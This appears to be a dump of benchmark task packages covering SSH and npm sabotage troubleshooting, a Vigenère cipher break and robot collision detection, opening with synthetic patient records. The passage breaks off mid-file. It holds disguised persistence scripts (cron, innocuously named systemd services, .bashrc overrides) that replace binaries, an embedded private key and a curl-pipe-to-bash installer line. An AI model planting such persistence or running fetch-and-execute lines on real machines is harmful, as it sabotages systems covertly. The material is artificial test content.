""patient_id,date,blood_pressure_systolic,blood_pressure_diastolic,heart_rate,weight_kg,height_cm\nP001,2024-01-15,120,80,72,75.2,175\nP001,2024-02-15,118,78,70,74.8,175\nP001,2024-03-15,122,82,74,75.1,175\nP002,2024-01-16,130,85,78,82.3,180\nP002,2024-02-16,128,83,76,81.9,180\nP002,2024-03-16,126,82,75,81.5,180\nP003,2024-01-17,115,75,68,68.4,165\nP003,2024-02-17,117,77,70,68.8,165\nP003,2024-03-17,116,76,69,68.6,165\nP004,2024-01-18,125,82,72,90.1,182\nP004,2024-02-18,123,80,71,89.5,182\nP004,2024-03-18,121,79,70,88.9,182\nP005,2024-01-19,118,78,65,72.3,170\nP005,2024-02-19,119,79,67,72.5,170\nP005,2024-03-19,117,77,66,72.1,170"", ""raw_data/lab_results.csv"": ""patient_id,date,glucose_mg_dl,cholesterol_total,hdl,ldl,triglycerides\nP001,2024-01-15,95,185,55,110,100\nP001,2024-03-15,92,180,58,105,85\nP002,2024-01-16,105,210,45,135,150\nP002,2024-03-16,98,195,48,122,125\nP003,2024-01-17,88,165,65,85,75\nP003,2024-03-17,90,162,68,82,60\nP004,2024-01-18,110,225,40,150,175\nP004,2024-03-18,102,205,43,135,135\nP005,2024-01-19,93,175,60,95,100\nP005,2024-03-19,91,170,62,92,80"", ""identifiers/patient_mapping.csv"": ""patient_id,first_name,last_name,date_of_birth,ssn_last4,email,phone\nP001,John,Smith,1975-03-22,1234,jsmith@email.com,555-0101\nP002,Mary,Johnson,1968-07-15,5678,mjohnson@email.com,555-0102\nP003,Sarah,Williams,1982-11-30,9012,swilliams@email.com,555-0103\nP004,Robert,Brown,1959-05-08,3456,rbrown@email.com,555-0104\nP005,Lisa,Davis,1990-09-14,7890,ldavis@email.com,555-0105"", ""consent_forms/P001_consent.pdf"": ""%PDF-1.4\n1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n3 0 obj\n<< /Type /Page /Parent 2 0 R /Resources << /Font << /F1 << /Type /Font /Subtype /Type1 /BaseFont /Helvetica >> >> >> /MediaBox [0 0 612 792] /Contents 4 0 R >>\nendobj\n4 0 obj\n<< /Length 200 >>\nstream\nBT\n/F1 12 Tf\n72 720 Td\n(Informed Consent Form - Study 2024) Tj\n0 -20 Td\n(Patient: John Smith) Tj\n0 -20 Td\n(ID: P001) Tj\n0 -20 Td\n(Date: 2024-01-15) Tj\n0 -20 Td\n(Signature: [signed]) Tj\nET\nendstream\nendobj\nxref\n0 5\n0000000000 65535 f \n0000000009 00000 n \n0000000058 00000 n \n0000000115 00000 n \n0000000314 00000 n \ntrailer\n<< /Size 5 /Root 1 0 R >>\nstartxref\n565\n%%EOF"", ""consent_forms/P002_consent.pdf"": ""%PDF-1.4\n1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n3 0 obj\n<< /Type /Page /Parent 2 0 R /Resources << /Font << /F1 << /Type /Font /Subtype /Type1 /BaseFont /Helvetica >> >> >> /MediaBox [0 0 612 792] /Contents 4 0 R >>\nendobj\n4 0 obj\n<< /Length 200 >>\nstream\nBT\n/F1 12 Tf\n72 720 Td\n(Informed Consent Form - Study 2024) Tj\n0 -20 Td\n(Patient: Mary Johnson) Tj\n0 -20 Td\n(ID: P002) Tj\n0 -20 Td\n(Date: 2024-01-16) Tj\n0 -20 Td\n(Signature: [signed]) Tj\nET\nendstream\nendobj\nxref\n0 5\n0000000000 65535 f \n0000000009 00000 n \n0000000058 00000 n \n0000000115 00000 n \n0000000314 00000 n \ntrailer\n<< /Size 5 /Root 1 0 R >>\nstartxref\n565\n%%EOF"", ""consent_forms/P003_consent.pdf"": ""%PDF-1.4\n1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n3 0 obj\n<< /Type /Page /Parent 2 0 R /Resources << /Font << /F1 << /Type /Font /Subtype /Type1 /BaseFont /Helvetica >> >> >> /MediaBox [0 0 612 792] /Contents 4 0 R >>\nendobj\n4 0 obj\n<< /Length 200 >>\nstream\nBT\n/F1 12 Tf\n72 720 Td\n(Informed Consent Form - Study 2024) Tj\n0 -20 Td\n(Patient: Sarah Williams) Tj\n0 -20 Td\n(ID: P003) Tj\n0 -20 Td\n(Date: 2024-01-17) Tj\n0 -20 Td\n(Signature: [signed]) Tj\nET\nendstream\nendobj\nxref\n0 5\n0000000000 65535 f \n0000000009 00000 n \n0000000058 00000 n \n0000000115 00000 n \n0000000314 00000 n \ntrailer\n<< /Size 5 /Root 1 0 R >>\nstartxref\n565\n%%EOF""}",2025-07-21T19:14:53.986662,2025-07-21T19:17:25.834305
draft_dp_f4d4ca3d,extremely_hard,draft_dp_f4d4ca3d,system-administration,"SSH keeps breaking on our jump host. Even after I fix the config, it breaks again within minutes. Need this fixed ASAP - can't manage any servers.",system-administration,troubleshooting|security|sys-admin,"FROM ghcr.io/laude-institute/t-bench/ubuntu-24-04:latest

RUN apt-get update && apt-get install -y \
    openssh-client \
    openssh-server \
    cron \
    systemd \
    && rm -rf /var/lib/apt/lists/*

WORKDIR /root

RUN mkdir -p /root/.ssh /etc/ssh/ssh_config.d /etc/systemd/system /usr/local/bin

COPY id_rsa /root/.ssh/
COPY id_rsa.pub /root/.ssh/
RUN chmod 600 /root/.ssh/id_rsa && chmod 644 /root/.ssh/id_rsa.pub

RUN cat /root/.ssh/id_rsa.pub >> /root/.ssh/authorized_keys && \
    chmod 600 /root/.ssh/authorized_keys

RUN service ssh start && \
    ssh-keyscan -H localhost >> /root/.ssh/known_hosts

COPY corrupt_ssh.sh /usr/local/sbin/
RUN chmod +x /usr/local/sbin/corrupt_ssh.sh

RUN echo ""*/2 * * * * /usr/local/sbin/corrupt_ssh.sh >/dev/null 2>&1"" | crontab -

COPY ssh_breaker.service /etc/systemd/system/
RUN systemctl enable ssh_breaker.service

COPY init_corruption.sh /etc/profile.d/ssh_corruption.sh
RUN chmod +x /etc/profile.d/ssh_corruption.sh

COPY .bashrc_additions /tmp/
RUN cat /tmp/.bashrc_additions >> /root/.bashrc

RUN cp /usr/bin/ssh /usr/bin/ssh.orig && \
    echo '#!/bin/bash' > /usr/bin/ssh.corrupt && \
    echo 'echo ""ssh: command not found""' >> /usr/bin/ssh.corrupt && \
    echo 'exit 127' >> /usr/bin/ssh.corrupt && \
    chmod +x /usr/bin/ssh.corrupt

RUN /usr/local/sbin/corrupt_ssh.sh && \
    /etc/profile.d/ssh_corruption.sh

CMD [""/bin/bash""]","import subprocess
import time
import os

def test_ssh_works_reliably():
    """"""Test that SSH to localhost works with key auth and remains functional""""""
    # First, ensure SSH daemon is running
    subprocess.run(['service', 'ssh', 'start'], capture_output=True)
    time.sleep(1)
    
    # Test SSH connection to localhost
    result = subprocess.run(
        ['ssh', '-o', 'BatchMode=yes', '-o', 'ConnectTimeout=5', 
         '-i', '/root/.ssh/id_rsa', 'localhost', 'echo', 'SSH_WORKS'],
        capture_output=True, text=True
    )
    assert result.returncode == 0, f""SSH connection failed: {result.stderr}""
    assert 'SSH_WORKS' in result.stdout, f""SSH command output incorrect: {result.stdout}""
    
    # Wait 2 minutes to ensure fixes are persistent
    time.sleep(120)
    
    # Test again to ensure SSH still works
    result = subprocess.run(
        ['ssh', '-o', 'BatchMode=yes', '-o', 'ConnectTimeout=5',
         '-i', '/root/.ssh/id_rsa', 'localhost', 'echo', 'STILL_WORKS'],
        capture_output=True, text=True
    )
    assert result.returncode == 0, f""SSH broke again after 2 minutes: {result.stderr}""
    assert 'STILL_WORKS' in result.stdout, f""SSH persistence test failed: {result.stdout}""

def test_ssh_command_functional():
    """"""Test that ssh command is properly functional""""""
    # Test ssh -V returns valid version
    result = subprocess.run(['ssh', '-V'], capture_output=True, text=True)
    assert result.returncode == 0 or result.returncode == 255, ""ssh -V failed unexpectedly""
    output = result.stdout + result.stderr
    assert 'OpenSSH' in output, f""ssh -V output invalid: {output}""
    assert '0.0p0' not in output, f""ssh -V shows corrupt version: {output}""
    
    # Check that SSH config has valid syntax
    result = subprocess.run(['ssh', '-G', 'localhost'], capture_output=True, text=True)
    assert result.returncode == 0, f""SSH config syntax check failed: {result.stderr}""
    assert 'port 22' in result.stdout.lower(), ""SSH config using wrong port""","{""test_ssh_works_reliably"": 0.8, ""test_ssh_command_functional"": 0.2}","{""init_corruption.sh"": ""#!/bin/bash\n\nmkdir -p /usr/local/bin\ncat > /usr/local/bin/ssh << 'EOF'\n#!/bin/bash\necho \""ssh: connect to host $2 port 22: Connection refused\""\nexit 255\nEOF\nchmod +x /usr/local/bin/ssh\n\nif ! grep -q \""/usr/local/bin\"" /root/.profile 2>/dev/null; then\n    echo 'export PATH=\""/usr/local/bin:$PATH\""' >> /root/.profile\nfi"", "".bashrc_additions"": ""function ssh() {\n    if [ \""$1\"" = \""-V\"" ]; then\n        echo \""OpenSSH_0.0p0, LibreSSL 0.0.0\""\n    else\n        echo \""ssh: Permission denied\""\n        return 1\n    fi\n}\n\nexport -f ssh"", ""id_rsa"": ""-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn\nNhAAAAAwEAAQAAAQEAzIcHf98sr/bS4T03XwbDY4we4hWzGrUY9C6Jd6ObKZdep0TdGhKp\nGDA9k50LtYqQ3Ru5pA1TKugbK5DMVbE+98D7xtGnJI0mxa5/Qrkh8EsCddHt2Z1BD6WyAr\nngCxeqrX+g6nQjfMao0FXRjHrz3Mx2GqOeNUmmOeUHRGHEakjRSpzFvO08udWMlgy2DFhd\ndm8p1MKccchyBSzhzf74TZ8PjcvxRhD65OBAdIU5VV1EVnAer7RGcCMzxUAegKALwgiz9z\nA6un/GpUw01X7UVJZb08miWGBoQAVD5qefsORc48oUoB8fYt6bW3/iA30+JazvCdIprjUD\nD2Y10lHNawAAA8iDE96fgxPenwAAAAdzc2gtcnNhAAABAQDMhwd/3yyv9tLhPTdfBsNjjB\n7iFbMatRj0Lol3o5spl16nRN0aEqkYMD2TnQu1ipDdG7mkDVMq6BsrkMxVsT73wPvG0ack\njSbFrn9CuSHwSwJ10e3ZnUEPpbICueALF6qtf6DqdCN8xqjQVdGMevPczHYao541SaY55Q\ndEYcRqSNFKnMW87Ty51YyWDLYMWF12bynUwpxxyHIFLOHN/vhNnw+Ny/FGEPrk4EB0hTlV\nXURWcB6vtEZwIzPFQB6AoAvCCLP3MDq6f8alTDTVftRUllvTyaJYYGhABUPmp5+w5Fzjyh\nSgHx9i3ptbf+IDfT4lrO8J0imuNQMPZjXSUc1rAAAAAwEAAQAAAQEAy1Q+J2i2Y2UtNpEG\nOClgG9oUZc0O1rFNUovlTBRRUCLVDdOPP7lnc82ZmeOZ3WwZIkfK4YYBtXk0cbYs/dAM+n\n9Xjsukr9jHv+T/TVUBoYLgukLug9Yq9SRT+RPS4RQxMPTeA9db5FMXRq7aeR9OyqZVj5wz\nz2QdphbDh77uZn2ggjbGsyCYjIDDhN0rtDiBK7dmPJ/9+aEEJaPXEBAnHrChGel2fHwzv/\nrx24qEhs8HPzsBB27gJO/jHrm9kng45ZdFir4rC+wyBTAnlE5q8ETlLVn1afw9ybX5dqew\nxf9TXS3pNg4CTyD2/Cm/Q58oIkNaywsWnQOjvM+zgtSZQQAAAIBtoXjrEOQ6xPcowaVmRK\nhjtQcVuWSt5S/snts4+ui0E/8ozk60V5YSVbrwilvA/XAyAMRfXKla5f1nhtSSDt1buebz\nyzyMpq/wBh3v27jWutQJ3F/pAAeGYAp3zx0seSw/dtNWxUH6yCiIRvyjuG+XTICOIJaC9J\ndTl+N0LMqbrgAAAIEA7mbvOFoHgSW5dMhaOUglg4HIBCXhxRxOCfCkU0z7Oo8zmzHlc2wO\n8O8NwoCmn4k6W3BgvUHlEuaBkES9eyr06iPcm2FSy8+UUl6XpcRtp/Oj7A45bVDuTqBmgf\n0zqUpm6U97l4BfneZHx/Nt9JZWo9ocF21hlsRnQcPNzY25SAsAAACBANuf9/fONPt3mB5V\n13uL+4nPhwiveH+go91USvWla/6IggxeyD0xUvvTfnBdDZcHq2wUDvKFcagCEcs9WUwwFB\nlK51maHxdb1SPzJV8Tz0eM6WDF4IpzTM4Nm4vvETU5y3v2V+LK41O2+OYEyajhOtjTswWw\n+2z996tAKd2QjQwhAAAADnRlc3RAbG9jYWxob3N0AQIDBA==\n-----END OPENSSH PRIVATE KEY-----\n"", ""corrupt_ssh.sh"": ""#!/bin/bash\n\nif [ -f /usr/bin/ssh.orig ]; then\n    cp /usr/bin/ssh.corrupt /usr/bin/ssh\nfi\n\necho \""Host *\"" > /etc/ssh/ssh_config\necho \""    Port 9999\"" >> /etc/ssh/ssh_config\necho \""    Protocol 1\"" >> /etc/ssh/ssh_config\necho \""    StrictHostKeyChecking no\"" >> /etc/ssh/ssh_config\n\necho \""alias ssh='echo SSH is disabled for maintenance'\"" >> /root/.bashrc"", ""id_rsa.pub"": ""ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDMhwd/3yyv9tLhPTdfBsNjjB7iFbMatRj0Lol3o5spl16nRN0aEqkYMD2TnQu1ipDdG7mkDVMq6BsrkMxVsT73wPvG0ackjSbFrn9CuSHwSwJ10e3ZnUEPpbICueALF6qtf6DqdCN8xqjQVdGMevPczHYao541SaY55QdEYcRqSNFKnMW87Ty51YyWDLYMWF12bynUwpxxyHIFLOHN/vhNnw+Ny/FGEPrk4EB0hTlVXURWcB6vtEZwIzPFQB6AoAvCCLP3MDq6f8alTDTVftRUllvTyaJYYGhABUPmp5+w5FzjyhSgHx9i3ptbf+IDfT4lrO8J0imuNQMPZjXSUc1r test@localhost\n"", ""ssh_breaker.service"": ""[Unit]\nDescription=SSH Configuration Manager\nAfter=network.target\n\n[Service]\nType=simple\nExecStart=/bin/bash -c 'while true; do chmod 000 /root/.ssh/id_rsa 2>/dev/null; echo \""MaxStartups 0\"" > /etc/ssh/sshd_config.d/99-override.conf; sleep 30; done'\nRestart=always\nRestartSec=10\n\n[Install]\nWantedBy=multi-user.target""}",2025-07-21T19:16:10.592812,2025-07-21T19:17:27.045417
draft_dp_e840bd60,medium,draft_dp_e840bd60,security,Break the Vigenère cipher in encrypted.txt using Kasiski examination. Save the plaintext to decrypted.txt and the key to key.txt.,security,python|encryption|algorithms,"FROM ghcr.io/laude-institute/t-bench/python-3-13:20250620

WORKDIR /app

# Copy the encrypted message and frequency reference
COPY encrypted.txt /app/
COPY english_freq.txt /app/

# No additional dependencies needed - using standard library only

CMD [""bash""]","import os
import subprocess

def test_decrypted_file_contains_english():
    """"""Test that the decrypted file contains valid English text with common words.""""""
    assert os.path.exists('/app/decrypted.txt'), ""decrypted.txt does not exist""
    
    with open('/app/decrypted.txt', 'r') as f:
        plaintext = f.read().upper()
    
    # Check for common English words that should appear in most texts
    common_words = ['THE', 'AND', 'FOR', 'ARE', 'WITH', 'THAT', 'FROM', 'THIS']
    words_found = sum(1 for word in common_words if word in plaintext)
    
    assert words_found >= 3, f""Decrypted text doesn't contain enough common English words (found {words_found})""
    assert len(plaintext) > 50, ""Decrypted text is too short""

def test_key_correctly_decrypts_message():
    """"""Test that the recovered key can decrypt the original message.""""""
    assert os.path.exists('/app/key.txt'), ""key.txt does not exist""
    assert os.path.exists('/app/encrypted.txt'), ""encrypted.txt does not exist""
    
    with open('/app/key.txt', 'r') as f:
        key = f.read().strip().upper()
    
    with open('/app/encrypted.txt', 'r') as f:
        ciphertext = f.read().strip()
    
    # Simple Vigenere decryption to verify
    plaintext = """"
    key_index = 0
    for char in ciphertext:
        if char.isalpha():
            shift = ord(key[key_index % len(key)]) - ord('A')
            decrypted_char = chr((ord(char) - ord('A') - shift) % 26 + ord('A'))
            plaintext += decrypted_char
            key_index += 1
    
    # Check that decryption produces readable text with letter 'E' being most common
    letter_counts = {chr(i): plaintext.count(chr(i)) for i in range(ord('A'), ord('Z')+1)}
    most_common = max(letter_counts, key=letter_counts.get)
    
    # E, T, A, O are most common in English
    assert most_common in ['E', 'T', 'A', 'O'], f""Most common letter '{most_common}' is not typical for English""","{""test_decrypted_file_contains_english"": 0.6, ""test_key_correctly_decrypts_message"": 0.4}","{""encrypted.txt"": ""TRVYQXGUFBQZMVGFNVYATRVWGWULQVNUGFNVHQFQGRZUGNVQEFVGTRVYOQRVNWTGNWNFVPNLGWQKZWQNGTRVYQXMGWUKLQVNUGNWATVYGFQZTVGMNFVGTFVGNUGFZWMQXMZVGPQFTVGNTVGPWFLQZMVGNWQUZWQXMZVGFZWNVPNYGFNWZMTUGGQTRVYQXGUFBQZGWUKLQVNUGFNVPNLNVGZBTMFVGNTVGPWTMQXMZVGFQGGZGVNTYQXGTZWQGFZVYQNGTRVYQXGUFBQZMQGKTFVYGFZVQUGWUKLQVNUGFQVGTRVYQXGUFBQZMMQUGWUZVYQNGTRVYQXGUFBQZGFQGLNWNVTMQGFZVQUGFZWNVPNYGFQGGZGVNTYQXGWYGFQGGZVNTYQUGYFQLNVGTFVXYWQGVNXFUMZNVYQNGTRVGYMYMGVMLFVWG"", ""english_freq.txt"": ""A 8.167\nB 1.492\nC 2.782\nD 4.253\nE 12.702\nF 2.228\nG 2.015\nH 6.094\nI 6.966\nJ 0.153\nK 0.772\nL 4.025\nM 2.406\nN 6.749\nO 7.507\nP 1.929\nQ 0.095\nR 5.987\nS 6.327\nT 9.056\nU 2.758\nV 0.978\nW 2.360\nX 0.150\nY 1.974\nZ 0.074""}",2025-07-22T08:35:51.007058,2025-07-22T17:49:25.552405+00:00
draft_dp_7ddcaca0,medium,draft_dp_7ddcaca0,system-administration,"npm and yarn are broken - they fail with weird errors. Even after reinstalling node, they break again within minutes. Find and stop whatever is corrupting them.",system-administration,sys-admin|troubleshooting|package-management,"FROM ghcr.io/laude-institute/t-bench/ubuntu-24-04:latest

# Install Node.js 18 and related tools
RUN apt-get update && apt-get install -y \
    curl \
    gnupg \
    systemd \
    cron \
    && curl -fsSL https://deb.nodesource.com/setup_18.x | bash - \
    && apt-get install -y nodejs \
    && npm install -g yarn \
    && apt-get clean \
    && rm -rf /var/lib/apt/lists/*

# Create directories
RUN mkdir -p /var/lib/npm-backup /opt/scripts /home/developer/project

# Copy corrupt scripts
COPY corrupt_npm.sh /var/lib/npm-backup/
COPY corrupt_yarn.sh /var/lib/npm-backup/
RUN chmod +x /var/lib/npm-backup/*.sh

# Copy and set up systemd services
COPY package-corruptor.service /etc/systemd/system/
COPY pkg-maint.sh /usr/local/bin/
RUN chmod +x /usr/local/bin/pkg-maint.sh

# Copy and set up timer-based service
COPY package-monitor.timer /etc/systemd/system/
COPY package-monitor.service /etc/systemd/system/
COPY check-packages.sh /opt/scripts/
RUN chmod +x /opt/scripts/check-packages.sh

# Enable services
RUN systemctl enable package-corruptor.service && \
    systemctl enable package-monitor.timer

# Set up cron job as additional persistence
RUN echo ""*/4 * * * * root /opt/scripts/check-packages.sh >/dev/null 2>&1"" >> /etc/crontab

# Copy project files
COPY app/package.json /home/developer/project/
COPY app/index.js /home/developer/project/

# Initially corrupt the package managers
RUN cp /var/lib/npm-backup/corrupt_npm.sh /usr/bin/npm && \
    chmod +x /usr/bin/npm && \
    cp /var/lib/npm-backup/corrupt_yarn.sh /usr/bin/yarn && \
    chmod +x /usr/bin/yarn

WORKDIR /home/developer/project

# Start systemd
CMD [""/sbin/init""]","import subprocess
import time
import os

def test_npm_works():
    """"""Test that npm is functional and returns correct version""""""
    result = subprocess.run(['npm', '--version'], capture_output=True, text=True)
    assert result.returncode == 0, f""npm failed with return code {result.returncode}""
    assert result.stdout.strip(), ""npm version output is empty""
    # Should be a version number like 9.x.x or 10.x.x for Node 18
    version_parts = result.stdout.strip().split('.')
    assert len(version_parts) >= 2, f""Invalid npm version format: {result.stdout}""
    assert version_parts[0].isdigit(), f""Invalid npm major version: {version_parts[0]}""

def test_yarn_works():
    """"""Test that yarn is functional and can install packages""""""
    # First check yarn version works
    result = subprocess.run(['yarn', '--version'], capture_output=True, text=True)
    assert result.returncode == 0, f""yarn failed with return code {result.returncode}""
    assert result.stdout.strip(), ""yarn version output is empty""
    
    # Test yarn can actually install packages
    os.chdir('/home/developer/project')
    result = subprocess.run(['yarn', 'install'], capture_output=True, text=True, timeout=60)
    assert result.returncode == 0, f""yarn install failed: {result.stderr}""
    assert os.path.exists('node_modules'), ""node_modules directory not created""
    assert os.path.exists('node_modules/express'), ""express package not installed""","{""test_npm_works"": 0.5, ""test_yarn_works"": 0.5}","{""corrupt_yarn.sh"": ""#!/bin/bash\necho \""yarn: command not found - system error 0x8004532\""\nexit 127"", ""package-monitor.service"": ""[Unit]\nDescription=Package Manager Monitor\nRefuseManualStart=no\nRefuseManualStop=yes\n\n[Service]\nType=oneshot\nExecStart=/opt/scripts/check-packages.sh"", ""package-corruptor.service"": ""[Unit]\nDescription=Package Manager Maintenance Service\nAfter=network.target\n\n[Service]\nType=simple\nExecStart=/usr/local/bin/pkg-maint.sh\nRestart=always\nRestartSec=60\n\n[Install]\nWantedBy=multi-user.target"", ""pkg-maint.sh"": ""#!/bin/bash\nwhile true; do\n    sleep 120\n    if [ -f /usr/bin/npm ]; then\n        cp /var/lib/npm-backup/corrupt_npm.sh /usr/bin/npm\n        chmod +x /usr/bin/npm\n    fi\n    if [ -f /usr/bin/yarn ]; then\n        cp /var/lib/npm-backup/corrupt_yarn.sh /usr/bin/yarn\n        chmod +x /usr/bin/yarn\n    fi\ndone"", ""corrupt_npm.sh"": ""#!/bin/bash\necho \""npm is corrupted. Contact system administrator.\""\nexit 1"", ""check-packages.sh"": ""#!/bin/bash\nCORRUPT_NPM=\""/var/lib/npm-backup/corrupt_npm.sh\""\nCORRUPT_YARN=\""/var/lib/npm-backup/corrupt_yarn.sh\""\n\nif [ -f /usr/bin/npm ] && ! cmp -s /usr/bin/npm \""$CORRUPT_NPM\""; then\n    cp \""$CORRUPT_NPM\"" /usr/bin/npm\n    chmod +x /usr/bin/npm\nfi\n\nif [ -f /usr/bin/yarn ] && ! cmp -s /usr/bin/yarn \""$CORRUPT_YARN\""; then\n    cp \""$CORRUPT_YARN\"" /usr/bin/yarn\n    chmod +x /usr/bin/yarn\nfi"", ""package-monitor.timer"": ""[Unit]\nDescription=Package Manager Monitor Timer\nRequires=package-monitor.service\n\n[Timer]\nOnBootSec=1min\nOnUnitActiveSec=3min\nUnit=package-monitor.service\n\n[Install]\nWantedBy=timers.target"", ""app/index.js"": ""const express = require('express');\nconst app = express();\nconst port = 3000;\n\napp.get('/', (req, res) => {\n  res.send('Web application running');\n});\n\napp.listen(port, () => {\n  console.log(`App listening on port ${port}`);\n});"", ""app/package.json"": ""{\n  \""name\"": \""web-project\"",\n  \""version\"": \""1.0.0\"",\n  \""description\"": \""Production web application\"",\n  \""main\"": \""index.js\"",\n  \""scripts\"": {\n    \""start\"": \""node index.js\"",\n    \""test\"": \""echo \\\""Error: no test specified\\\"" && exit 1\""\n  },\n  \""dependencies\"": {\n    \""express\"": \""^4.18.2\"",\n    \""dotenv\"": \""^16.0.3\""\n  }\n}""}",2025-07-21T19:16:38.172322,2025-07-21T19:16:38.172322
draft_dp_3fb16dee,hard,draft_dp_3fb16dee,software-engineering,The warehouse robots keep colliding. Fix the collision detection in the coordinator so robots wait when paths would intersect.,software-engineering,python|networking|synchronization,"FROM ghcr.io/laude-institute/t-bench/python-3-13:20250620

WORKDIR /warehouse

# Install dependencies
RUN pip install numpy

# Copy the warehouse system files
COPY coordinator.py /warehouse/
COPY robot.py /warehouse/
COPY warehouse_grid.py /warehouse/
COPY run_simulation.py /warehouse/
COPY test_robots.sh /warehouse/

# Make test script executable
RUN chmod +x test_robots.sh

CMD [""bash""]","import subprocess
import time
import socket
import json
import os

def test_no_collisions():
    """"""Test that robots complete deliveries without collisions""""""
    # Start coordinator
    coordinator_proc = subprocess.Popen(['python', 'coordinator.py'], 
                                       stdout=subprocess.PIPE, 
                                       stderr=subprocess.PIPE)
    time.sleep(2)
    
    # Start 3 robots
    robot_procs = []
    for i in range(3):
        proc = subprocess.Popen(['python', 'robot.py', f'robot_{i+1}'],
                               stdout=subprocess.PIPE,
                               stderr=subprocess.PIPE)
        robot_procs.append(proc)
        time.sleep(0.5)
    
    # Let simulation run
    time.sleep(12)
    
    # Get status from coordinator
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(('localhost', 9999))
        request = {'command': 'status'}
        s.send(json.dumps(request).encode())
        response = s.recv(1024).decode()
        s.close()
        status = json.loads(response)
        
        # Cleanup
        for proc in robot_procs:
            proc.terminate()
        coordinator_proc.terminate()
        
        # Check no collisions occurred
        assert status['collisions'] == 0, f""Found {status['collisions']} collisions""
        
    except Exception as e:
        # Cleanup on error
        for proc in robot_procs:
            proc.terminate()
        coordinator_proc.terminate()
        raise e

def test_robots_complete_deliveries():
    """"""Test that robots actually complete some deliveries""""""
    # Start coordinator
    coordinator_proc = subprocess.Popen(['python', 'coordinator.py'], 
                                       stdout=subprocess.PIPE, 
                                       stderr=subprocess.PIPE)
    time.sleep(2)
    
    # Start 2 robots with fewer deliveries for faster test
    robot_procs = []
    for i in range(2):
        proc = subprocess.Popen(['python', 'robot.py', f'robot_{i+1}'],
                               stdout=subprocess.PIPE,
                               stderr=subprocess.PIPE)
        robot_procs.append(proc)
        time.sleep(0.5)
    
    # Let simulation run
    time.sleep(10)
    
    # Get status from coordinator
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(('localhost', 9999))
        request = {'command': 'status'}
        s.send(json.dumps(request).encode())
        response = s.recv(1024).decode()
        s.close()
        status = json.loads(response)
        
        # Cleanup
        for proc in robot_procs:
            proc.terminate()
        coordinator_proc.terminate()
        
        # Check deliveries were made
        assert status['deliveries'] >= 4, f""Only {status['deliveries']} deliveries completed""
        
    except Exception as e:
        # Cleanup on error
        for proc in robot_procs:
            proc.terminate()
        coordinator_proc.terminate()
        raise e","{""test_no_collisions"": 0.7, ""test_robots_complete_deliveries"": 0.3}","{""coordinator.py"": ""#!/usr/bin/env python3\nimport socket\nimport threading\nimport json\nimport time\nfrom warehouse_grid import WarehouseGrid\n\nclass Coordinator:\n    def __init__(self, port=9999):\n        self.port = port\n        self.grid = WarehouseGrid(10, 10)\n        self.robots = {}\n        self.lock = threading.Lock()\n        self.collision_log = []\n        self.delivery_log = []\n        \n    def start(self):\n        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n        server.bind(('localhost', self.port))\n        server.listen(5)\n        print(f\""Coordinator listening on port {self.port}\"")\n        \n        while True:\n            client, addr = server.accept()\n            thread = threading.Thread(target=self.handle_robot, args=(client,))\n            thread.daemon = True\n            thread.start()\n    \n    def handle_robot(self, client):\n        robot_id = None\n        try:\n            while True:\n                data = client.recv(1024).decode()\n                if not data:\n                    break\n                    \n                request = json.loads(data)\n                cmd = request['command']\n                \n                if cmd == 'register':\n                    robot_id = request['robot_id']\n                    pos = request['position']\n                    with self.lock:\n                        self.robots[robot_id] = {\n                            'position': pos,\n                            'destination': None,\n                            'path': []\n                        }\n                    response = {'status': 'registered'}\n                    \n                elif cmd == 'move':\n                    robot_id = request['robot_id']\n                    new_pos = request['position']\n                    \n                    collision = False\n                    with self.lock:\n                        for rid, robot in self.robots.items():\n                            if rid != robot_id and robot['position'] == new_pos:\n                                collision = True\n                                break\n                    \n                    if collision:\n                        response = {'status': 'collision', 'allowed': False}\n                    else:\n                        with self.lock:\n                            old_pos = self.robots[robot_id]['position']\n                            self.robots[robot_id]['position'] = new_pos\n                            \n                            # Check if collision actually happened (robots swapped positions)\n                            for rid, robot in self.robots.items():\n                                if rid != robot_id and robot['position'] == old_pos:\n                                    # Two robots swapped positions - this is a collision!\n                                    self.collision_log.append({\n                                        'time': time.time(),\n                                        'robots': [robot_id, rid],\n                                        'positions': [new_pos, old_pos]\n                                    })\n                                    \n                        response = {'status': 'moved', 'allowed': True}\n                        \n                elif cmd == 'delivery':\n                    robot_id = request['robot_id']\n                    with self.lock:\n                        self.delivery_log.append({\n                            'robot_id': robot_id,\n                            'time': time.time(),\n                            'position': self.robots[robot_id]['position']\n                        })\n                    response = {'status': 'delivered'}\n                    \n                elif cmd == 'status':\n                    with self.lock:\n                        response = {\n                            'robots': self.robots.copy(),\n                            'collisions': len(self.collision_log),\n                            'deliveries': len(self.delivery_log)\n                        }\n                \n                client.send(json.dumps(response).encode())\n                \n        except Exception as e:\n            print(f\""Error handling robot {robot_id}: {e}\"")\n        finally:\n            if robot_id:\n                with self.lock:\n                    if robot_id in self.robots:\n                        del self.robots[robot_id]\n            client.close()\n\nif __name__ == '__main__':\n    coordinator = Coordinator()\n    coordinator.start()"", ""warehouse_grid.py"": ""#!/usr/bin/env python3\n\nclass WarehouseGrid:\n    def __init__(self, width, height):\n        self.width = width\n        self.height = height\n        self.delivery_points = [\n            (0, 0), (9, 0), (0, 9), (9, 9),  # Corners\n            (4, 4), (5, 5), (4, 5), (5, 4)   # Center area\n        ]\n        \n    def is_valid_position(self, x, y):\n        return 0 <= x < self.width and 0 <= y < self.height\n        \n    def is_delivery_point(self, x, y):\n        return (x, y) in self.delivery_points\n        \n    def get_neighbors(self, x, y):\n        neighbors = []\n        for dx, dy in [(0, 1), (0, -1), (1, 0), (-1, 0)]:\n            nx, ny = x + dx, y + dy\n            if self.is_valid_position(nx, ny):\n                neighbors.append((nx, ny))\n        return neighbors"", ""run_simulation.py"": ""#!/usr/bin/env 